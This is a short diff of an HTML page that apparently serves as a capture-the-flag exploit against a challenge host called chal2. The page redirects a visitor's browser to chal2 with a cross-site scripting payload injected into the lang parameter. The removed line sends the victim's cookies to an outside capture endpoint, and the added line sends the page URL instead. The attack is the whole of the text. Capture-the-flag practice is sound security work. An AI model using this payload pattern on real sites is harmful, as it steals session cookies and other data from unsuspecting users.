@@ -2,9 +2,9 @@
 <html>
   <body>
     <script>
-      // The payload to inject into the lang parameter on chal2
-      var xss = '";fetch(\'https://ssrf-eta.vercel.app/api/capture?c=\'+encodeURIComponent(document.cookie));//';
-      // Redirect the browser to chal2 with the XSS payload in lang
+      // XSS payload: will cause chal2 to send its location.href to your API endpoint
+      var xss = '";fetch(\'https://ssrf-eta.vercel.app/api/capture?href=\'+encodeURIComponent(location.href));//';
+      // Redirect to chal2 with the XSS payload in the lang param
       location.href = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xss);
     </script>
   </body>
